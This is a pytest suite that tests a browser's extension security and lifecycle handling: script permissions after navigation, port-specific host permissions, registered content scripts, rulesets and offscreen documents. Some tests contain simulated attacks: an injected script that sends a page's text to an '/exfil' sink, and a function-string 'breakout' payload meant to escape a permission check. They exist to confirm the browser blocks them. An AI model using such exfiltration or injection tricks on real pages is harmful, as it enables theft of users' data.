"""Fifth review round: scripts sent to a tab that has gone on to another site by the time they get there, host
permissions for one port, registered content scripts and host permissions that change, an extension that keeps
changing its registrations as its worker starts, rulesets and offscreen documents across updates and reloads."""
from __future__ import annotations

import json
from pathlib import Path

import pytest
from PyQt6.QtCore import QUrl
from PyQt6.QtNetwork import QNetworkCookie

from helpers import run_js, run_js_async, spin, stays_absent, wait_attr, wait_until
from test_extension_apis import load_tab
from test_extension_review import ext_page, simple_ext
from test_extension_review3 import REG, _register, _settled

SECRET = b"<!doctype html><title>Mail</title><body>inbox: ACCOUNT-RESET-CODE-424242</body>"


# ══════════════════════════════════════════════════════════════════════════════════════════
#  SEC3-1: a script runs only where the extension may go - checked in the page, when it runs there
# ══════════════════════════════════════════════════════════════════════════════════════════
def _racer(harness, server, tmp_path, name="Racer"):
    server.add("/secret", SECRET, "text/html")
    server.add("/exfil", b"", "image/gif")
    files = {"probe.js": "document.documentElement.setAttribute('data-file', location.host); location.host;\n"}
    return harness.install_ok(simple_ext(tmp_path / name, name, files, permissions=["storage", "scripting"],
                                         host_permissions=["http://x.foo.localhost/*"]), name)


def test_scripts_dont_run_in_the_same_site_page_a_tab_went_on_to(window, harness, server, tmp_path):
    """The extension may access x.foo.localhost only. It sends the tab to y.foo.localhost (the same site: the same
    renderer) and keeps calling executeScript while the tab's URL still says x: none of them may run on y."""
    ext = _racer(harness, server, tmp_path)
    tab = window.current_tab()
    a_url = f"http://x.foo.localhost:{server.port}/page?n="
    b_url = f"http://y.foo.localhost:{server.port}/secret"
    assert not harness.controller.bridge.can_access(ext.id, b_url)
    page = ext_page(harness, ext)
    sink = server.url("/exfil?d=")
    outcomes = []
    for attempt in range(4):
        load_tab(tab, a_url + str(attempt))
        out = run_js_async(page, f"""
          const T = {tab.tab_id};
          const run = (f) => chrome.scripting.executeScript({{target: {{tabId: T}}, func: f}}).then(r => r[0].result, e => 'ERR ' + e.message);
          const results = [await run(() => {{ location.href = {json.dumps(b_url)}; return 'sent'; }})];
          for (let i = 0; i < 30; i++) results.push(await run(() => {{
            if (location.host.startsWith('y.') && !window.__hooked) {{
              window.__hooked = true;
              const leak = () => {{ new Image().src = {json.dumps(sink)} + encodeURIComponent(location.href + ' ' + document.body.innerText); }};
              if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', leak); else leak();
            }}
            return location.host;
          }}));
          return results;
        """, timeout=60)
        assert out[0] == "sent", out  # (the extension may script x)
        outcomes += out
        spin(0.5)
    leaks = [r for r in server.requests if r.startswith("/exfil")]
    assert not leaks, leaks[:2]
    assert not [o for o in outcomes if isinstance(o, str) and o.startswith("y.")], outcomes
    assert any(isinstance(o, str) and "Cannot access contents of the page" in o for o in outcomes), outcomes  # (it did get there)


def _stale_tab(window, harness, server, monkeypatch, url_seen: str):
    """A tab on y.foo.localhost whose URL still reads x.foo.localhost: as the page is between the commit of a
    navigation and Foxglove hearing of it."""
    tab = window.current_tab()
    load_tab(tab, f"http://y.foo.localhost:{server.port}/secret")
    monkeypatch.setattr(tab, "url", lambda: QUrl(url_seen))
    return tab


@pytest.mark.parametrize("world", ["ISOLATED", "MAIN"])
def test_scripts_check_where_the_page_is_when_they_run(window, harness, server, tmp_path, monkeypatch, world):
    ext = _racer(harness, server, tmp_path)
    page = ext_page(harness, ext)
    tab = _stale_tab(window, harness, server, monkeypatch, f"http://x.foo.localhost:{server.port}/page")
    target = f"target: {{tabId: {tab.tab_id}}}, world: '{world}'"
    calls = {
        "func": f"chrome.scripting.executeScript({{{target}, func: () => document.documentElement.setAttribute('data-func', 'ran')}})",
        "files": f"chrome.scripting.executeScript({{{target}, files: ['probe.js']}})",
        # a "function" whose text closes the function it is put in, to run before (or after) a check made in there
        "breakout": f"chrome.scripting.executeScript({{{target}, func: {{toString: () => "
                    "\"0)} catch (e) {} })(); document.documentElement.setAttribute('data-breakout', 'ran'); (() => { try { (0\"}})",
        "css": f"chrome.scripting.insertCSS({{target: {{tabId: {tab.tab_id}}}, css: 'body {{ color: rgb(9, 8, 7) !important; }}'}})",
    }
    for name, call in calls.items():
        got = run_js_async(page, f"try {{ return JSON.stringify(await {call}); }} catch (e) {{ return 'ERR ' + e.message; }}")
        assert "Cannot access contents of the page" in got, (name, got)
    spin(0.5)
    for name in ("data-func", "data-file", "data-breakout"):
        assert run_js(tab.page, f"document.documentElement.getAttribute('{name}')") is None, name
    assert run_js(tab.page, "getComputedStyle(document.body).color") != "rgb(9, 8, 7)"


def test_scripts_follow_a_page_to_another_place_they_may_go(window, harness, server, tmp_path, monkeypatch):
    """Where the page is when the script gets there is what counts: a place the extension may access runs it."""
    ext = harness.install_ok(simple_ext(tmp_path / "w", "Wide", {"probe.js": "document.title + ' via file';\n"},
                                        permissions=["storage", "scripting"], host_permissions=["http://*.foo.localhost/*"]), "Wide")
    page = ext_page(harness, ext)
    tab = _stale_tab(window, harness, server, monkeypatch, f"http://x.foo.localhost:{server.port}/page")
    assert run_js_async(page, f"return (await chrome.scripting.executeScript({{target: {{tabId: {tab.tab_id}}}, "
                              "func: () => document.title + ' ' + location.host}))[0].result") == f"Mail y.foo.localhost:{server.port}"
    assert run_js_async(page, f"return (await chrome.scripting.executeScript({{target: {{tabId: {tab.tab_id}}}, "
                              "files: ['probe.js']}))[0].result") == "Mail via file"


@pytest.mark.parametrize("script, after", [
    ("'use strict';\nfoo();", "'use strict';;GUARD\nfoo();"),
    ('/* lib */\n"use strict"\nvar x = 1;', '/* lib */\n"use strict";GUARD\nvar x = 1;'),
    ("'use strict'\n(function () {})();", "GUARD'use strict'\n(function () {})();"),  # (no directive: a call)
    ("var a = 'use strict';", "GUARDvar a = 'use strict';"),
])
def test_the_check_keeps_a_files_use_strict(fg, script, after):
    assert fg.ExtensionBridge._after_directives(script, "GUARD") == after


# ══════════════════════════════════════════════════════════════════════════════════════════
#  SEC3-3: a call whose page went to another renderer before it ran is answered
# ══════════════════════════════════════════════════════════════════════════════════════════
def test_scripts_sent_to_a_page_that_moved_to_another_renderer_are_answered(window, harness, server, tmp_path):
    ext = _racer(harness, server, tmp_path, "Mover")
    tab = window.current_tab()
    a_url = f"http://x.foo.localhost:{server.port}/page?n="
    b_url = server.url("/secret")  # another site: another renderer
    page = ext_page(harness, ext)
    outcomes = []
    for attempt in range(3):
        load_tab(tab, a_url + str(attempt))
        outcomes += run_js_async(page, f"""
          const T = {tab.tab_id};
          const run = (f) => Promise.race([chrome.scripting.executeScript({{target: {{tabId: T}}, func: f}}).then(r => r[0].result, e => 'ERR ' + e.message),
                                           new Promise(r => setTimeout(() => r('HANG'), 15000))]);
          await run(() => {{ location.href = {json.dumps(b_url)}; return 1; }});
          const results = [];
          for (let i = 0; i < 8; i++) results.push(await run(() => location.host));
          return results;
        """, timeout=150)
        spin(0.3)
    assert "HANG" not in outcomes, outcomes
    assert not [o for o in outcomes if isinstance(o, str) and o.startswith("127.")], outcomes


# ══════════════════════════════════════════════════════════════════════════════════════════
#  SEC3-2: a host permission for one port is for that port only
# ══════════════════════════════════════════════════════════════════════════════════════════
@pytest.mark.parametrize("pattern, url, expected", [
    ("http://127.0.0.1:3000/*", "http://127.0.0.1:41979/page", False),
    ("http://127.0.0.1:3000/*", "http://127.0.0.1:3000/page", True),
    ("http://127.0.0.1/*", "http://127.0.0.1:41979/page", True),
    ("http://127.0.0.1:*/*", "http://127.0.0.1:41979/page", True),
    ("http://127.0.0.1:80/*", "http://127.0.0.1/page", True),
    ("https://example.com:443/*", "https://example.com/", True),
    ("https://example.com:443/*", "https://example.com:8443/", False),
    ("*://*.example.com:81/*", "http://www.example.com:81/x", True),
    ("*://*.example.com:81/*", "http://www.example.com/x", False),
    ("*://*.example.com/*", "https://example.com:81/x", True),
])
def test_match_patterns_with_ports(fg, pattern, url, expected):
    assert fg.match_pattern(pattern, url) is expected
    assert fg.PatternSet([pattern]).matches(url) is expected


def test_a_host_permission_for_one_port_is_for_that_port(window, harness, server, tmp_path):
    ext = harness.install_ok(simple_ext(tmp_path / "p", "DevTool", permissions=["storage", "scripting", "cookies"],
                                        host_permissions=["http://127.0.0.1:3000/*"]), "DevTool")
    bridge = harness.controller.bridge
    wait_until(lambda: bridge._cookies_ready, 5, "the cookie store")
    cookie = QNetworkCookie(b"sid", b"admin-session")
    cookie.setHttpOnly(True)
    cookie.setPath("/")
    harness.profile.cookieStore().setCookie(cookie, QUrl(server.url("/")))
    tab = window.current_tab()
    load_tab(tab, server.page_url())  # 127.0.0.1:<another port>
    assert not bridge.can_access(ext.id, server.url("/"))
    assert bridge.can_access(ext.id, "http://127.0.0.1:3000/x")
    page = ext_page(harness, ext)
    assert "url" not in run_js_async(page, f"return await chrome.tabs.get({tab.tab_id})")
    with pytest.raises(AssertionError, match="Cannot access contents"):
        run_js_async(page, f"return await chrome.scripting.executeScript({{target: {{tabId: {tab.tab_id}}}, func: () => document.title}})")
    spin(0.5)
    assert "sid" not in run_js_async(page, "return (await chrome.cookies.getAll({})).map((c) => c.name)")


# ══════════════════════════════════════════════════════════════════════════════════════════
#  LC3-1: registered content scripts follow the host permissions granted and taken back
# ══════════════════════════════════════════════════════════════════════════════════════════
PERM_SW = """
chrome.permissions.onRemoved.addListener((p) => chrome.storage.local.set({removed: p}));
chrome.permissions.onAdded.addListener((p) => chrome.storage.local.set({added: p}));
"""


def _cs_files(entry) -> list:
    return [js for cs in json.loads((Path(entry.path) / "manifest.json").read_text()).get("content_scripts") or [] for js in cs.get("js", [])]


def test_registered_scripts_follow_the_hosts_granted_and_removed(window, harness, server, tmp_path, fg, monkeypatch):
    entry = harness.install_ok(simple_ext(tmp_path / "o", "Optional", REG, sw=PERM_SW, permissions=["storage", "scripting"],
                                          optional_host_permissions=["http://127.0.0.1/*"]), "Optional")
    c = harness.controller
    page = ext_page(harness, entry)
    # registered before the host is granted: kept, but not where it can't go
    assert _register(page, [{"id": "A", "matches": ["http://127.0.0.1/*"], "js": ["reg.js"]}]) == "ok"
    harness.drop_page(page)
    spin(1.5)
    _settled(harness, entry)
    assert "reg.js" not in _cs_files(entry)
    monkeypatch.setattr(fg, "ask_question", lambda *a, **k: True)
    answers = []
    c.bridge.api_permissions_request(entry.id, {"origins": ["http://127.0.0.1/*"]}, {"from": "", "cs": False, "tab": None})(answers.append)
    wait_until(lambda: answers, 5, "the answer")
    assert answers == [True]
    wait_until(lambda: "reg.js" in _cs_files(entry), 10, "the script in the manifest")
    _settled(harness, entry)
    assert wait_attr(harness.fresh_page(server.page_url()), "data-reg") == "yes"  # (Chrome: once the host is granted)
    # taken back: the script goes, and the worker hears of it
    page = ext_page(harness, entry)
    with pytest.raises(AssertionError, match="You cannot remove required permissions"):
        run_js_async(page, "return await chrome.permissions.remove({permissions: ['storage']})")
    assert run_js_async(page, "return await chrome.permissions.remove({origins: ['http://127.0.0.1/*']})") is True
    wait_until(lambda: "reg.js" not in _cs_files(entry), 10, "the script out of the manifest")
    harness.drop_page(page)
    _settled(harness, entry)
    assert stays_absent(harness.fresh_page(server.page_url()), "data-reg")
    page = ext_page(harness, entry)
    got = run_js_async(page, "return await chrome.storage.local.get(['added', 'removed'])")
    assert got["removed"] == {"permissions": [], "origins": ["http://127.0.0.1/*"]}, got
    assert run_js_async(page, "return await chrome.permissions.contains({origins: ['http://127.0.0.1/*']})") is False
    assert run_js_async(page, "return (await chrome.scripting.getRegisteredContentScripts()).map((s) => s.id)") == ["A"]  # (still registered)


# ══════════════════════════════════════════════════════════════════════════════════════════
#  LC3-2: a worker that changes its registrations in steps as it starts isn't reloaded for ever
# ══════════════════════════════════════════════════════════════════════════════════════════
TWO_STEP_SW = r"""
// at every worker start: the script with its defaults at once, then the user's setting once it's loaded (slowly)
(async () => {
  const have = await chrome.scripting.getRegisteredContentScripts();
  const entry = {id: 'cs', matches: ['http://127.0.0.1/*'], js: ['reg.js'], allFrames: false};
  if (have.length) await chrome.scripting.updateContentScripts([entry]); else await chrome.scripting.registerContentScripts([entry]);
  await new Promise((r) => setTimeout(r, 1500));  // e.g. waiting for settings / a server
  await chrome.scripting.updateContentScripts([{id: 'cs', allFrames: true}]);
})();
"""


def test_a_worker_changing_its_scripts_in_steps_at_start_isnt_reloaded_for_ever(harness, tmp_path, fg):
    c = harness.controller
    unloads, unload = [], c.manager.unloadExtension
    c.manager.unloadExtension = lambda info: (unloads.append(info.id()), unload(info))[1]
    entry = harness.install_ok(simple_ext(tmp_path / "two", "TwoStep", REG, sw=TWO_STEP_SW, permissions=["storage", "scripting"],
                                          host_permissions=["<all_urls>"]), "TwoStep")
    spin(20)
    assert len(unloads) <= 3, f"reloaded {len(unloads)} times in 20 s"
    _settled(harness, entry)
    assert [s.get("allFrames") for s in c.bridge._registered(entry.id)] == [True]
    manifest = json.loads((Path(entry.path) / "manifest.json").read_text())
    assert [cs.get("all_frames") for cs in manifest["content_scripts"] if "reg.js" in cs["js"]] == [True]  # (what it ends with)


# ══════════════════════════════════════════════════════════════════════════════════════════
#  LC3-3: an update goes back to the manifest's static rulesets
# ══════════════════════════════════════════════════════════════════════════════════════════
def _dnr_ext(src, version, resources):
    files = {f"{r['id']}.json": json.dumps([{"id": 1, "action": {"type": "block"},
                                              "condition": {"urlFilter": f"/{r['id']}/", "resourceTypes": ["image"]}}]) for r in resources}
    return simple_ext(src, "Rules", files, permissions=["storage", "declarativeNetRequest"], version=version,
                      declarative_net_request={"rule_resources": [{**r, "path": f"{r['id']}.json"} for r in resources]})


def test_enabled_rulesets_go_back_to_the_manifests_on_update(harness, tmp_path):
    src = tmp_path / "dnr"
    entry = harness.install_ok(_dnr_ext(src, "1.0", [{"id": "base", "enabled": True}, {"id": "extra", "enabled": False}]), "Rules")
    page = ext_page(harness, entry)
    run_js_async(page, "await chrome.declarativeNetRequest.updateEnabledRulesets({enableRulesetIds: ['extra']}); return 1")
    assert sorted(run_js_async(page, "return await chrome.declarativeNetRequest.getEnabledRulesets()")) == ["base", "extra"]
    harness.drop_page(page)
    _dnr_ext(src, "2.0", [{"id": "base", "enabled": True}, {"id": "extra", "enabled": False}, {"id": "v2rules", "enabled": True}])
    start = len(harness.messages)
    harness.controller.install_from_path(str(src))
    wait_until(lambda: ("success", "“Rules” was updated.") in harness.messages[start:], 30, "the update")
    page = ext_page(harness, harness.wait_state(entry.id, True))
    assert sorted(run_js_async(page, "return await chrome.declarativeNetRequest.getEnabledRulesets()")) == ["base", "v2rules"]


# ══════════════════════════════════════════════════════════════════════════════════════════
#  LC3-4: Foxglove's reload for registered scripts keeps the extension's offscreen document
# ══════════════════════════════════════════════════════════════════════════════════════════
OFF_SW = r"""
const make = () => chrome.offscreen.createDocument({url: 'off.html', reasons: ['CLIPBOARD'], justification: 'x'}).catch(() => {});
chrome.runtime.onInstalled.addListener(make);
chrome.runtime.onStartup.addListener(make);
chrome.runtime.onMessage.addListener((m, s, reply) => {
  if (m === 'ask') { chrome.runtime.sendMessage({to: 'off'}).then((r) => reply('off said ' + r), (e) => reply('ERR ' + e.message)); return true; }
});
"""
OFF_FILES = {**REG, "off.html": """<!doctype html><meta charset="utf-8"><script src="off.js"></script>""",
             "off.js": "chrome.runtime.onMessage.addListener((m, s, reply) => { if (m && m.to === 'off') reply('pong'); });"}


def test_the_offscreen_document_survives_a_reload_for_registered_scripts(harness, tmp_path):
    entry = harness.install_ok(simple_ext(tmp_path / "off", "Offs", OFF_FILES, sw=OFF_SW, permissions=["storage", "scripting", "offscreen"],
                                          host_permissions=["<all_urls>"]), "Offs")
    page = ext_page(harness, entry)
    ask = "return [await chrome.offscreen.hasDocument(), await chrome.runtime.sendMessage('ask')]"
    wait_until(lambda: run_js_async(page, ask) == [True, "off said pong"], 10, "the offscreen document")
    assert _register(page, [{"id": "A", "matches": ["http://127.0.0.1/*"], "js": ["reg.js"]}]) == "ok"
    harness.drop_page(page)
    wait_until(lambda: entry.id in harness.controller._updates, 10, "the reload")
    _settled(harness, entry)
    page = ext_page(harness, entry)
    wait_until(lambda: run_js_async(page, ask) == [True, "off said pong"], 10, "the offscreen document after the reload")


# ══════════════════════════════════════════════════════════════════════════════════════════
#  LC3-5, LC3-6, LC3-8: quitting while a question is open or a copy is made; Replace during a reload
# ══════════════════════════════════════════════════════════════════════════════════════════
def test_a_message_that_comes_as_the_window_goes_is_dropped(window, harness):
    from PyQt6 import sip
    sip.delete(window.content.toast)  # as when the replace question is answered by quitting
    harness.controller.message.emit("“X” was left as it was.", "info")


def test_a_copy_that_ends_after_quitting_is_dropped(harness, monkeypatch):
    import threading
    from PyQt6 import sip
    errors, go, results = [], threading.Event(), []
    monkeypatch.setattr(threading, "excepthook", lambda args: errors.append(args.exc_value))
    c = harness.controller
    before = set(c._relays)
    c._in_background(lambda: go.wait(10) and "copied", results.append)
    relay = next(iter(set(c._relays) - before))
    sip.delete(relay)  # Foxglove quit meanwhile
    go.set()
    spin(0.5)
    assert not errors and not results


def test_replace_accepted_during_a_reload_happens_after_it(harness, tmp_path):
    from test_extension_review3 import _registrar
    c = harness.controller
    entry = _registrar(harness, tmp_path)
    key = json.loads((Path(entry.path) / "manifest.json").read_text())["key"]
    other = simple_ext(tmp_path / "copy", "Registrar", REG, permissions=["storage", "scripting"], host_permissions=["<all_urls>"],
                       version="9.0", key=key)
    asked = []
    c.replace_requested.connect(asked.append)
    c.install_from_path(str(other))
    wait_until(lambda: asked, 20, "the question")
    page = ext_page(harness, entry)
    assert _register(page, [{"id": "A", "matches": ["http://127.0.0.1/*"], "js": ["reg.js"]}]) == "ok"
    harness.drop_page(page)
    wait_until(lambda: entry.id in c._updates, 10, "the reload to start")
    c.resolve_replace(asked[0], True)  # the user clicks "Replace" while Foxglove reloads it
    wait_until(lambda: (e := harness.entry(entry.id)) is not None and e.version == "9.0", 30, "the replacement")
    assert len(asked) == 1  # (not asked again)
    _settled(harness, entry)
